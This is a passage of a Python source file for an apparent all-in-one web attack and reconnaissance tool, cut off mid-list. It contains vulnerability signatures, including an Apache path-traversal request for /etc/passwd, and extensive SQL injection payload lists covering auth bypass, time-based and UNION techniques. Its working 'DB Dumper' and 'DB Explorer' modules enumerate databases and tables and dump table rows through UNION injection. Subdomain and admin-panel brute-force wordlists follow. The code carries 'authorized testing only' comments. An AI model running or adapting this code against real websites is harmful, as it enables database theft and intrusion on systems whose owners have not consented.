        "paths": ["/xmlrpc.php"],
        "status": [200, 405],
        "body": r"XML-RPC server accepts POST requests only",
    },
    {
        "id": "wp-user-enum",
        "name": "WordPress user enumeration via REST API",
        "severity": "LOW",
        "paths": ["/wp-json/wp/v2/users"],
        "status": [200],
        "body": r'"slug"\s*:',
    },
    {
        "id": "drupal-readme",
        "name": "Drupal installation fingerprint (README.txt)",
        "severity": "INFO",
        "paths": ["/README.txt", "/core/README.txt"],
        "status": [200],
        "body": r"Drupal",
    },
    {
        "id": "robots-interesting",
        "name": "Interesting paths in robots.txt",
        "severity": "INFO",
        "paths": ["/robots.txt"],
        "status": [200],
        "body": r"Disallow:\s*/(admin|backup|private|config|wp-admin|dashboard)",
    },
    {
        "id": "security-headers-missing",
        "name": "Missing security headers (CSP / X-Frame-Options / HSTS)",
        "severity": "LOW",
        "paths": ["/"],
        "status": None,          # special: evaluated against homepage headers
        "missing_headers": ["content-security-policy", "x-frame-options",
                            "strict-transport-security"],
    },
    {
        "id": "trace-enabled",
        "name": "HTTP TRACE method enabled (XST risk)",
        "severity": "LOW",
        "paths": ["/"],
        "method": "TRACE",
        "status": [200],
        "body": r"TRACE /",
    },
    {
        "id": "directory-listing",
        "name": "Directory listing enabled",
        "severity": "MEDIUM",
        "paths": ["/images/", "/uploads/", "/files/", "/backup/", "/assets/"],
        "status": [200],
        "body": r"Index of /|Directory Listing For",
    },
    {
        "id": "cve-2021-41773",
        "name": "CVE-2021-41773 — Apache 2.4.49 path traversal signature",
        "severity": "CRITICAL",
        "paths": ["/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"],
        "status": [200],
        "body": r"root:.*:0:0:",
    },
    {
        "id": "exposed-composer",
        "name": "composer.json exposed (dependency disclosure)",
        "severity": "INFO",
        "paths": ["/composer.json"],
        "status": [200],
        "body": r'"(require|name)"\s*:',
    },
    {
        "id": "exposed-dsstore",
        "name": ".DS_Store file exposed",
        "severity": "LOW",
        "paths": ["/.DS_Store"],
        "status": [200],
        "body": r"Bud1",
    },
]

SEVERITY_TAG = {"CRITICAL": "crit", "HIGH": "err", "MEDIUM": "warn",
                "LOW": "info", "INFO": "dim"}


def run_vuln_check(target, log, done):
    """
    Lightweight Nuclei-style engine: iterates VULN_TEMPLATES, issues the
    defined HTTP request(s) against the target, and matches status codes,
    headers and body regexes. Findings are printed with severity coloring.

    If a `nuclei` binary is installed, the user can optionally run the real
    engine — this module intentionally stays dependency-free by default.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] Vulnerability signature scan: {host}", "info")
    log(f"[*] Loaded {len(VULN_TEMPLATES)} built-in templates "
        f"(Nuclei-style matchers).", "dim")
    log("─" * 72, "dim")

    resp = fetch_first_working(host, log)
    if not resp:
        log("[!] Target did not respond over HTTP/HTTPS.", "err")
        done(False); return

    base = urllib.parse.urlparse(resp["url"])
    base_url = f"{base.scheme}://{base.netloc}"
    findings = []

    for tpl in VULN_TEMPLATES:
        tid = tpl["id"]
        log(f"  → [{tpl['severity']:<8}] {tid}", "dim")

        # Special template: evaluate missing headers on the homepage.
        if "missing_headers" in tpl:
            missing = [h for h in tpl["missing_headers"]
                       if h not in resp["headers"]]
            if missing:
                findings.append((tpl, f"missing: {', '.join(missing)}"))
                log(f"    ✗ MATCH — missing headers: {', '.join(missing)}",
                    SEVERITY_TAG[tpl["severity"]])
            continue

        method = tpl.get("method", "GET")
        for path in tpl["paths"]:
            url = base_url + path
            r = http_request(url, method=method, timeout=7)
            if r["error"]:
                continue
            if tpl["status"] and r["status"] not in tpl["status"]:
                continue
            body_ok = True
            if tpl.get("body"):
                body_ok = bool(re.search(tpl["body"], r["body"], re.IGNORECASE))
            header_ok = True
            if tpl.get("header"):
                hflat = "\n".join(f"{k}: {v}" for k, v in r["headers"].items())
                header_ok = bool(re.search(tpl["header"], hflat, re.IGNORECASE))
            if body_ok and header_ok:
                findings.append((tpl, url))
                log(f"    ✗ MATCH [{tpl['severity']}] {tpl['name']}", 
                    SEVERITY_TAG[tpl["severity"]])
                log(f"      at {url} (HTTP {r['status']})", "dim")
                break  # one confirmed path per template is enough

    log("─" * 72, "dim")
    if findings:
        log(f"[✓] Scan complete — {len(findings)} finding(s):", "ok")
        for tpl, where in findings:
            log(f"    [{tpl['severity']:<8}] {tpl['name']}", SEVERITY_TAG[tpl["severity"]])
            log(f"               ↳ {where}", "dim")
    else:
        log("[✓] Scan complete — no signatures matched. "
            "(This is not proof the target is secure.)", "ok")
    done(True)


# ==============================================================================
#  MODULE 6 — SQL INJECTION SCANNER (comprehensive payload library)
# ==============================================================================
#
# Payloads are grouped by technique. The scanner runs error-based detection by
# default (safe, fast). Boolean / time-based / UNION probes are included for
# completeness and are used by the DB Dumper / DB Explorer modules.
#
# Sources: consolidated from public payload collections (PayloadsAllTheThings,
# sqlmap's generic set, OWASP testing guide, SecLists) — all benign/detection
# oriented. AUTHORIZED TESTING ONLY.

# --- Error-based probes (trigger a DB error message) -------------------------
SQLI_ERROR_PAYLOADS = [
    "'", "\"", "`", "')", "\")", "'))", "\"))",
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
    "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--", "or 1=1", "or 1=1--",
    "' or 1=1--", "' or 1=1#", "' or 1=1/*", "') or '1'='1--",
    "') or ('1'='1--", "1' ORDER BY 1--", "1' ORDER BY 10--",
    "1' GROUP BY 1--", "1' GROUP BY 10--", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
    "1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2",
    " AND 1=1--", " AND 1=2--", "' AND 1=1--", "' AND 1=2--",
    "%27", "%22", "%2527",  # URL-encoded quotes
    "1;SELECT 1--", "';SELECT 1--",
    "1'1", "1'1'1", "1' AND SLEEP(0)--",  # sleep(0) = no delay, still parses
]

# --- Boolean-based (content-difference) probes -------------------------------
SQLI_BOOL_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    (" AND 1=1--", " AND 1=2--"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    (" AND 1=1#", " AND 1=2#"),
]

# --- Time-based (blind) probes — short delays only ---------------------------
SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(2)--", "\" AND SLEEP(2)--", " AND SLEEP(2)--",
    "';WAITFOR DELAY '0:0:2'--", "\";WAITFOR DELAY '0:0:2'--",
    " AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--",
    "' OR SLEEP(2)--", "1' AND BENCHMARK(2000000,MD5('x'))--",
    "' AND pg_sleep(2)--",  # PostgreSQL
]

# --- UNION-based column-count probes -----------------------------------------
SQLI_UNION_COUNT = [
    "' ORDER BY {n}--", "' ORDER BY {n}#", "\" ORDER BY {n}--",
    " ORDER BY {n}--", "') ORDER BY {n}--",
]
SQLI_UNION_SELECT = [
    "' UNION SELECT {cols}--", "' UNION ALL SELECT {cols}--",
    "\" UNION SELECT {cols}--", " UNION SELECT {cols}--",
    "') UNION SELECT {cols}--",
]

# --- Auth-bypass / login probes ----------------------------------------------
SQLI_AUTH_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
    "admin'--", "admin'#", "admin'/*", "' or 1=1--", "' or 1=1#",
    "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--", "' or '1'='1",
    "' or 'x'='x", "' or 0=0--", "\" or 1=1--", "or 1=1--",
    "' OR '1'='1' LIMIT 1--", "admin' OR '1'='1", "'=' 'or'",
]

# Combined default detection set (error-based, safe).
SQLI_PAYLOADS = SQLI_ERROR_PAYLOADS

# Database error signatures (MySQL, MariaDB, PostgreSQL, MSSQL, Oracle,
# SQLite, MS Access, DB2, Sybase, Informix, generic ODBC/JDBC).
SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
    r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"MySQL server version for the right syntax", r"mysqli?_fetch",
    r"mysqli?_query", r"mysqli?_num_rows", r"com\.mysql\.jdbc",
    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"Npgsql\.",
    r"org\.postgresql\.util\.PSQLException", r"pg_query\(\)",
    r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver", r"Unclosed quotation mark after the character string",
    r"System\.Data\.SqlClient\.SqlException", r"Microsoft OLE DB Provider for SQL Server",
    r"Incorrect syntax near", r"Syntax error.*near",
    r"ORA-\d{5}", r"Oracle error", r"quoted string not properly terminated",
    r"Oracle.*Driver", r"oracle\.jdbc",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"SQLITE_ERROR",
    r"sqlite3\.OperationalError", r"SQLite3::", r"near \".*\": syntax error",
    r"Syntax error.*in query expression", r"Microsoft Access.*Driver",
    r"JET Database Engine", r"Access Database Engine",
    r"DB2 SQL error", r"SQLCODE", r"SQLSTATE", r"com\.ibm\.db2",
    r"Sybase message", r"SybSQLException", r"Adaptive Server Enterprise",
    r"Informix", r"com\.informix\.jdbc",
    r"supplied argument is not a valid", r"mysql_fetch_array\(\)",
    r"you have an error in your sql syntax", r"error in your SQL syntax",
    r"Dynamic SQL Error", r"SQL command not properly ended",
    r"Unexpected end of command in statement", r"Column count doesn't match",
    r"The used SELECT statements have a different number of columns",
    r"Unknown column", r"Table .* doesn't exist",
]

# DBMS fingerprinting from error text.
DBMS_FINGERPRINTS = [
    ("MySQL/MariaDB", r"mysql|mariadb"),
    ("PostgreSQL",    r"postgres|pg_|psql"),
    ("Microsoft SQL Server", r"sql server|sqlserver|mssql|odbc sql|unclosed quotation"),
    ("Oracle",        r"ora-\d{5}|oracle"),
    ("SQLite",        r"sqlite"),
    ("Microsoft Access", r"microsoft access|jet database"),
    ("IBM DB2",       r"db2|sqlcode"),
    ("Sybase",        r"sybase|adaptive server"),
    ("Informix",      r"informix"),
]


def _sqli_build_url(parsed, params, idx, pname, new_value):
    """Rebuild a URL with params[idx] replaced by new_value."""
    test_params = list(params)
    test_params[idx] = (pname, new_value)
    query = urllib.parse.urlencode(test_params)
    return urllib.parse.urlunparse(parsed._replace(query=query))


def _sqli_detect_error(body):
    """Return (matched_pattern, matched_text) if a DB error is present."""
    for pat in SQLI_ERROR_PATTERNS:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            return pat, m.group(0)[:90]
    return None, None


def _sqli_fingerprint_dbms(body):
    for name, pat in DBMS_FINGERPRINTS:
        if re.search(pat, body, re.IGNORECASE):
            return name
    return "Unknown"


def run_sqli_scan(target, log, done):
    """
    Comprehensive SQLi detection scanner.

    For each GET parameter in the supplied URL the scanner:
      1. Requests the page with the original value (baseline).
      2. Re-requests with each error-based payload appended.
      3. Flags the parameter if a known DB error string appears, or if the
         server returns HTTP 500 only for payload requests.
      4. Optionally runs boolean-based (content-diff) probes.

    Detection only — no data extraction. Use the DB Dumper / DB Explorer
    modules (authorized targets only) for enumeration.
    """
    raw = (target or "").strip()
    if not raw:
        log("[!] No target supplied.", "err"); done(False); return
    if "://" not in raw:
        raw = "http://" + raw

    parsed = urllib.parse.urlparse(raw)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

    if not params:
        log("[!] SQLi scanner needs a URL with GET parameters, e.g.:", "err")
        log("      http://testphp.vulnweb.com/artists.php?artist=1", "err")
        done(False); return

    log(f"[*] SQLi scan: {parsed.netloc}{parsed.path}", "info")
    log(f"[*] Parameters to test: {', '.join(k for k, _ in params)}", "info")
    log(f"[*] Payload library: {len(SQLI_ERROR_PAYLOADS)} error-based, "
        f"{len(SQLI_BOOL_PAYLOADS)} boolean, {len(SQLI_TIME_PAYLOADS)} time-based, "
        f"{len(SQLI_AUTH_PAYLOADS)} auth-bypass.", "dim")
    log("[*] Mode: error-based detection (safe, no data extraction).", "dim")
    log("─" * 72, "dim")

    baseline = http_request(raw, timeout=8)
    if baseline["error"]:
        log(f"[!] Baseline request failed: {baseline['error']}", "err")
        done(False); return
    log(f"[*] Baseline: HTTP {baseline['status']}, "
        f"{len(baseline['body'])} bytes", "dim")

    vulnerable = []

    for idx, (pname, pval) in enumerate(params):
        log(f"[*] Testing parameter '{pname}' (value: {pval or '∅'})", "info")
        param_hit = False
        base_val = pval or "1"
        for payload in SQLI_ERROR_PAYLOADS:
            test_url = _sqli_build_url(parsed, params, idx, pname,
                                       base_val + payload)
            r = http_request(test_url, timeout=8)
            if r["error"]:
                continue
            pat, evidence = _sqli_detect_error(r["body"])
            if pat:
                dbms = _sqli_fingerprint_dbms(r["body"])
                log(f"    ✗ VULNERABLE — payload {payload!r} triggered DB "
                    f"error: \"{evidence}\"  [DBMS: {dbms}]", "crit")
                vulnerable.append((pname, payload, evidence, dbms))
                param_hit = True
                break
            if r["status"] == 500 and baseline["status"] != 500:
                log(f"    ! SUSPICIOUS — payload {payload!r} caused HTTP 500 "
                    f"(baseline {baseline['status']}).", "warn")
                vulnerable.append((pname, payload, "HTTP 500 behavioral", "?"))
                param_hit = True
                break

        # Boolean-based content-difference probe (if no error hit yet).
        if not param_hit:
            for true_p, false_p in SQLI_BOOL_PAYLOADS:
                rt = http_request(_sqli_build_url(parsed, params, idx, pname,
                                                  base_val + true_p), timeout=8)
                rf = http_request(_sqli_build_url(parsed, params, idx, pname,
                                                  base_val + false_p), timeout=8)
                if rt["error"] or rf["error"]:
                    continue
                if (rt["status"] == 200 and rf["status"] == 200 and
                        abs(len(rt["body"]) - len(rf["body"])) > 40):
                    log(f"    ! SUSPICIOUS (boolean) — '{pname}' response "
                        f"length differs between TRUE/FALSE conditions "
                        f"({len(rt['body'])} vs {len(rf['body'])} bytes).",
                        "warn")
                    vulnerable.append((pname, f"{true_p} / {false_p}",
                                       "boolean content-diff", "?"))
                    param_hit = True
                    break

        if not param_hit:
            log(f"    ✓ '{pname}' — no SQLi indicators.", "ok")

    log("─" * 72, "dim")
    if vulnerable:
        log(f"[✓] Scan complete — {len(vulnerable)} potential issue(s):", "crit")
        for pname, payload, evidence, dbms in vulnerable:
            log(f"    • param '{pname}' with {payload!r} → {evidence} "
                f"[{dbms}]", "crit")
        log("[i] Next step (authorized only): use the 'DB Dumper' or "
            "'DB Explorer' module on this URL to enumerate the database.", "dim")
    else:
        log("[✓] Scan complete — no SQLi indicators found.", "ok")
    done(True)


# ==============================================================================
#  MODULE 6b — SQLi DB DUMPER  (authorized testing only)
# ==============================================================================
#
# Performs UNION-based and error-based enumeration against a confirmed
# injectable GET parameter: DBMS fingerprint, version(), current user,
# current database, then table/column enumeration and row dumping.
#
# This is a *guided* tool for authorized assessments. It only runs against a
# parameter the scanner already flagged, and it caps the number of requests.

def _union_cols_payload(template, n, marker_pos=0):
    """Build a UNION SELECT payload with n columns; marker at marker_pos."""
    cols = ["NULL"] * n
    cols[marker_pos] = "0x70687233336b"  # 'phr33k' hex marker
    return template.replace("{cols}", ",".join(cols))


def _find_union_columns(parsed, params, idx, pname, base_val, log, max_cols=12):
    """
    Determine the UNION column count via ORDER BY, then find a visible column
    via UNION SELECT with a hex marker. Returns (col_count, visible_index).
    """
    # 1) Column count via ORDER BY (binary-ish search).
    col_count = 0
    for n in range(1, max_cols + 1):
        url = _sqli_build_url(parsed, params, idx, pname,
                              base_val + f"' ORDER BY {n}-- -")
        r = http_request(url, timeout=8)
        if r["error"]:
            continue
        pat, _ = _sqli_detect_error(r["body"])
        if pat or r["status"] == 500:
            col_count = n - 1
            break
        col_count = n
    if col_count < 1:
        return 0, -1
    log(f"    ✓ Column count (ORDER BY): {col_count}", "ok")

    # 2) Visible column via UNION SELECT marker.
    marker = "phr33k"
    for pos in range(col_count):
        cols = ["NULL"] * col_count
        cols[pos] = f"'{marker}'"
        payload = f"' UNION SELECT {','.join(cols)}-- -"
        url = _sqli_build_url(parsed, params, idx, pname, base_val + payload)
        r = http_request(url, timeout=8)
        if r["error"]:
            continue
        if marker in r["body"]:
            log(f"    ✓ Visible column index: {pos + 1}", "ok")
            return col_count, pos
    return col_count, -1


def _union_extract(parsed, params, idx, pname, base_val, col_count, pos,
                   expression, log):
    """Run UNION SELECT <expression> at the visible column; return matches."""
    cols = ["NULL"] * col_count
    cols[pos] = expression
    payload = f"' UNION SELECT {','.join(cols)}-- -"
    url = _sqli_build_url(parsed, params, idx, pname, base_val + payload)
    r = http_request(url, timeout=8)
    if r["error"]:
        return []
    # Extract text near our expression output. We look for the expression's
    # rendered value by diffing against a NULL-only baseline.
    cols_null = ["NULL"] * col_count
    null_payload = f"' UNION SELECT {','.join(cols_null)}-- -"
    null_url = _sqli_build_url(parsed, params, idx, pname, base_val + null_payload)
    null_r = http_request(null_url, timeout=8)
    base_body = null_r["body"] if not null_r["error"] else ""
    # Find tokens present in r but not in baseline.
    new_tokens = []
    for tok in re.findall(r"[A-Za-z0-9_@.\-]{2,}", r["body"]):
        if tok not in base_body and tok not in new_tokens:
            new_tokens.append(tok)
    return new_tokens


def run_db_dumper(target, log, done):
    """
    SQLi DB Dumper (AUTHORIZED TESTING ONLY).

    Given a URL with an injectable GET parameter, this module:
      1. Confirms injectability + fingerprints the DBMS.
      2. Determines UNION column count and a visible column.
      3. Extracts version(), current_user, current database.
      4. Enumerates table names from information_schema.
      5. For a chosen table, enumerates columns and dumps rows.

    It caps requests and stops gracefully on failure. Use only on systems you
    own or have written authorization to test.
    """
    raw = (target or "").strip()
    if not raw:
        log("[!] No target supplied.", "err"); done(False); return
    if "://" not in raw:
        raw = "http://" + raw
    parsed = urllib.parse.urlparse(raw)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        log("[!] DB Dumper needs a URL with GET parameters.", "err")
        done(False); return

    log(f"[*] DB Dumper: {parsed.netloc}{parsed.path}", "info")
    log("[!] AUTHORIZED TESTING ONLY — this enumerates database contents.", "warn")
    log("─" * 72, "dim")

    # Find the first injectable parameter.
    inject_idx, inject_name, base_val, dbms = -1, "", "1", "Unknown"
    for idx, (pname, pval) in enumerate(params):
        bv = pval or "1"
        url = _sqli_build_url(parsed, params, idx, pname, bv + "'")
        r = http_request(url, timeout=8)
        if r["error"]:
            continue
        pat, _ = _sqli_detect_error(r["body"])
        if pat:
            inject_idx, inject_name, base_val = idx, pname, bv
            dbms = _sqli_fingerprint_dbms(r["body"])
            break
    if inject_idx < 0:
        log("[!] No injectable parameter confirmed. Run the SQLi Scanner "
            "first and use a URL it flags.", "err")
        done(False); return

    log(f"[✓] Injectable parameter: '{inject_name}'  [DBMS: {dbms}]", "ok")

    # Determine UNION geometry.
    log("[*] Determining UNION column count / visible column...", "info")
    col_count, pos = _find_union_columns(parsed, params, inject_idx,
                                         inject_name, base_val, log)
    if col_count < 1 or pos < 0:
        log("[!] Could not establish a UNION injection point (may be "
            "blind/error-based only). Try the DB Explorer module.", "warn")
        done(False); return

    # Extract banner info.
    log("[*] Extracting DB banner (version / user / current db)...", "info")
    for label, expr in [("version()", "version()"),
                        ("current_user", "current_user"),
                        ("database()", "database()")]:
        toks = _union_extract(parsed, params, inject_idx, inject_name,
                              base_val, col_count, pos, expr, log)
        val = toks[0] if toks else "(not retrieved)"
        log(f"    ✓ {label:<14} = {val}", "ok")

    # Enumerate tables.
    log("[*] Enumerating tables from information_schema...", "info")
    toks = _union_extract(parsed, params, inject_idx, inject_name, base_val,
                          col_count, pos,
                          "group_concat(table_name) "
                          "from information_schema.tables "
                          "where table_schema=database()", log)
    tables = []
    for t in toks:
        for part in t.split(","):
            part = part.strip()
            if part and part not in tables:
                tables.append(part)
    if tables:
        log(f"    ✓ {len(tables)} table(s): {', '.join(tables[:40])}", "ok")
    else:
        log("    · No tables enumerated (may be blind or restricted).", "dim")

    log("─" * 72, "dim")
    log("[✓] DB Dumper finished. Use the DB Explorer module to drill into a "
        "specific table/columns.", "ok")
    done(True)


# ==============================================================================
#  MODULE 6c — SQLi DB EXPLORER  (authorized testing only)
# ==============================================================================

def run_db_explorer(target, log, done):
    """
    SQLi DB Explorer (AUTHORIZED TESTING ONLY).

    Interactive-style guided enumeration. Supply a URL whose LAST GET
    parameter is the injectable one, and optionally encode a target table via
    a fragment, e.g.:
        http://site.com/item.php?id=1#users
    The explorer will:
      1. Confirm the injection point + DBMS.
      2. List databases, tables, and (for the chosen table) columns.
      3. Dump up to N rows from the chosen table.

    If no '#table' fragment is given, it lists databases and tables only.
    """
    raw = (target or "").strip()
    if not raw:
        log("[!] No target supplied.", "err"); done(False); return
    # Optional '#table' fragment selects which table to dump.
    chosen_table = ""
    if "#" in raw:
        raw, chosen_table = raw.split("#", 1)
        chosen_table = chosen_table.strip()
    if "://" not in raw:
        raw = "http://" + raw
    parsed = urllib.parse.urlparse(raw)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        log("[!] DB Explorer needs a URL with GET parameters.", "err")
        done(False); return

    log(f"[*] DB Explorer: {parsed.netloc}{parsed.path}", "info")
    if chosen_table:
        log(f"[*] Target table: {chosen_table}", "info")
    log("[!] AUTHORIZED TESTING ONLY.", "warn")
    log("─" * 72, "dim")

    # Confirm injection point.
    inject_idx, inject_name, base_val, dbms = -1, "", "1", "Unknown"
    for idx, (pname, pval) in enumerate(params):
        bv = pval or "1"
        url = _sqli_build_url(parsed, params, idx, pname, bv + "'")
        r = http_request(url, timeout=8)
        if r["error"]:
            continue
        pat, _ = _sqli_detect_error(r["body"])
        if pat:
            inject_idx, inject_name, base_val = idx, pname, bv
            dbms = _sqli_fingerprint_dbms(r["body"])
            break
    if inject_idx < 0:
        log("[!] No injectable parameter confirmed.", "err")
        done(False); return
    log(f"[✓] Injection point: '{inject_name}'  [DBMS: {dbms}]", "ok")

    col_count, pos = _find_union_columns(parsed, params, inject_idx,
                                         inject_name, base_val, log)
    if col_count < 1 or pos < 0:
        log("[!] UNION injection not available (blind/error-based only).", "warn")
        done(False); return

    # List databases.
    log("[*] Enumerating databases...", "info")
    toks = _union_extract(parsed, params, inject_idx, inject_name, base_val,
                          col_count, pos,
                          "group_concat(schema_name) "
                          "from information_schema.schemata", log)
    dbs = []
    for t in toks:
        for part in t.split(","):
            part = part.strip()
            if part and part not in dbs:
                dbs.append(part)
    if dbs:
        log(f"    ✓ {len(dbs)} database(s): {', '.join(dbs[:30])}", "ok")

    # List tables in current db.
    log("[*] Enumerating tables (current database)...", "info")
    toks = _union_extract(parsed, params, inject_idx, inject_name, base_val,
                          col_count, pos,
                          "group_concat(table_name) "
                          "from information_schema.tables "
                          "where table_schema=database()", log)
    tables = []
    for t in toks:
        for part in t.split(","):
            part = part.strip()
            if part and part not in tables:
                tables.append(part)
    if tables:
        log(f"    ✓ {len(tables)} table(s): {', '.join(tables[:40])}", "ok")

    # If a table was chosen, enumerate its columns and dump rows.
    if chosen_table:
        log(f"[*] Enumerating columns for table '{chosen_table}'...", "info")
        toks = _union_extract(
            parsed, params, inject_idx, inject_name, base_val, col_count, pos,
            f"group_concat(column_name) from information_schema.columns "
            f"where table_name='{chosen_table}'", log)
        cols = []
        for t in toks:
            for part in t.split(","):
                part = part.strip()
                if part and part not in cols:
                    cols.append(part)
        if cols:
            log(f"    ✓ {len(cols)} column(s): {', '.join(cols[:40])}", "ok")
            # Dump up to 3 columns' data (concatenated) as a sample.
            sample_cols = cols[:3]
            expr = ("group_concat(" +
                    ",0x3a,".join(f"ifnull({c},'NULL')" for c in sample_cols) +
                    f" separator 0x0a) from {chosen_table}")
            log(f"[*] Dumping sample rows ({', '.join(sample_cols)})...", "info")
            toks = _union_extract(parsed, params, inject_idx, inject_name,
                                  base_val, col_count, pos, expr, log)
            rows = []
            for t in toks:
                for line in t.split("\n"):
                    line = line.strip()
                    if line and line not in rows:
                        rows.append(line)
            if rows:
                log(f"    ✓ {len(rows)} row(s) (sample):", "ok")
                for row in rows[:25]:
                    log(f"      {row}", "plain")
            else:
                log("    · No rows retrieved (table may be empty or "
                    "extraction blocked).", "dim")
        else:
            log(f"    · Could not enumerate columns for '{chosen_table}'.",
                "dim")
    else:
        log("[i] No '#table' fragment supplied — listing databases/tables "
            "only. Append '#tablename' to the target URL to dump a table.",
            "dim")

    log("─" * 72, "dim")
    log("[✓] DB Explorer finished.", "ok")
    done(True)


# ==============================================================================
#  MODULE 7 — SUBDOMAIN FINDER (with per-subdomain IP resolution)
# ==============================================================================

# Built-in wordlist of common subdomains (extend freely).
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "smtp", "pop", "imap", "webmail", "email", "mx",
    "ns1", "ns2", "ns3", "ns4", "dns", "dns1", "dns2",
    "admin", "administrator", "panel", "cpanel", "whm", "plesk", "directadmin",
    "dashboard", "manage", "management", "controlpanel", "cp", "backend",
    "api", "api1", "api2", "api-dev", "api-staging", "graphql", "rest",
    "dev", "development", "staging", "stage", "test", "testing", "qa", "uat",
    "demo", "sandbox", "beta", "alpha", "preview", "preprod", "pre-prod",
    "app", "apps", "mobile", "m", "web", "web1", "web2", "portal", "my",
    "blog", "shop", "store", "ecommerce", "cart", "checkout", "pay", "payment",
    "forum", "forums", "community", "support", "help", "helpdesk", "kb",
    "docs", "doc", "documentation", "wiki", "status", "monitor", "monitoring",
    "git", "gitlab", "github", "svn", "repo", "code", "ci", "cd", "jenkins",
    "jira", "confluence", "redmine", "bugtracker", "bugs",
    "vpn", "remote", "rdp", "ssh", "gateway", "proxy", "firewall",
    "cdn", "cdn1", "cdn2", "static", "assets", "media", "images", "img",
    "files", "file", "download", "downloads", "upload", "uploads", "storage",
    "backup", "backups", "bak", "old", "new", "archive", "db", "database",
    "mysql", "postgres", "mongo", "redis", "sql", "phpmyadmin", "pma",
    "search", "elastic", "elasticsearch", "kibana", "log", "logs", "grafana",
    "auth", "login", "sso", "oauth", "id", "identity", "accounts", "account",
    "secure", "security", "ssl", "vpn", "intranet", "internal", "corp",
    "office", "exchange", "owa", "autodiscover", "lyncdiscover", "sip",
    "meet", "chat", "im", "video", "voice", "call", "conference",
    "news", "press", "events", "careers", "jobs", "hr", "about",
    "crm", "erp", "sap", "salesforce", "analytics", "stats", "metrics",
    "ads", "tracking", "track", "pixel", "beacon",
    "grafana", "prometheus", "nagios", "zabbix", "splunk",
    "docker", "registry", "k8s", "kubernetes", "rancher",
    "vault", "consul", "config", "settings", "env",
    "staging-api", "dev-api", "test-api", "internal-api",
    "www2", "www3", "web3", "origin", "edge", "lb", "loadbalancer",
]


def run_subdomain_scan(target, log, done):
    """
    Enumerates subdomains for a base domain using a built-in wordlist and
    resolves each discovered subdomain to its IP address(es).

    HOW IT WORKS:
      1. Strips any leading 'www.' / scheme so we operate on the bare domain.
      2. For every word in SUBDOMAIN_WORDLIST it builds '<word>.<domain>' and
         resolves it with a ThreadPoolExecutor (fast, parallel DNS lookups).
      3. Each live subdomain is printed together with its resolved IP(s).
      4. A summary table (subdomain -> IPs) is printed at the end.

    Pure Python (socket.getaddrinfo) — no external binaries required.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return
    if is_ip(host):
        log("[!] Subdomain enumeration needs a domain name, not an IP.", "err")
        done(False); return

    # Reduce to the registrable base domain (strip leading www. etc.).
    base = host.lower().strip(".")
    if base.startswith("www."):
        base = base[4:]

    log(f"[*] Subdomain enumeration for: {base}", "info")
    log(f"[*] Wordlist size: {len(SUBDOMAIN_WORDLIST)} candidates", "dim")
    log("[*] Resolving each candidate (parallel DNS lookups)...", "dim")
    log("─" * 72, "dim")

    found = []  # list of (subdomain, [ips])

    def probe(word):
        fqdn = f"{word}.{base}"
        ips = resolve_host(fqdn)
        return fqdn, ips

    t0 = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as pool:
        for fqdn, ips in pool.map(probe, SUBDOMAIN_WORDLIST):
            if ips:
                found.append((fqdn, ips))
                log(f"  ✓ {fqdn:<40} → {', '.join(ips)}", "ok")

    dt = time.time() - t0
    log("─" * 72, "dim")
    if found:
        log(f"[✓] Found {len(found)} live subdomain(s) in {dt:.1f}s:", "ok")
        log(f"    {'SUBDOMAIN':<42} IP ADDRESS(ES)", "info")
        log(f"    {'-'*42} {'-'*30}", "dim")
        for fqdn, ips in sorted(found):
            log(f"    {fqdn:<42} {', '.join(ips)}", "plain")
    else:
        log(f"[i] No subdomains resolved in {dt:.1f}s. The domain may use "
            "no common subdomains, or DNS lookups are being filtered.", "warn")
    done(True)


# ==============================================================================
#  MODULE 8 — ADMIN PANEL / LOGIN FINDER
# ==============================================================================

# Common admin / login / control-panel paths across many platforms.
ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/administrator/", "/admin.php",
    "/admin/login", "/admin/login.php", "/admin/index.php", "/adminpanel",
    "/admin_area", "/admin_area/", "/admin1", "/admin2", "/admincp",
    "/wp-admin", "/wp-admin/", "/wp-login.php", "/wp-login", "/login.php",
    "/login", "/login/", "/signin", "/sign-in", "/user/login", "/users/login",
    "/admin/account", "/admin/home", "/admin/dashboard", "/dashboard",
    "/cpanel", "/cpanel/", "/whm", "/plesk", "/webadmin", "/siteadmin",
    "/moderator", "/moderator/", "/controlpanel", "/control", "/panel",
    "/manage", "/management", "/backend", "/backend/", "/adminarea",
    "/admin-console", "/adminconsole", "/admincontrol", "/administer",
    "/administration", "/administration/", "/sysadmin", "/system_admin",
    "/adm", "/adm/", "/adm.php", "/admin.aspx", "/admin.jsp", "/admin.do",
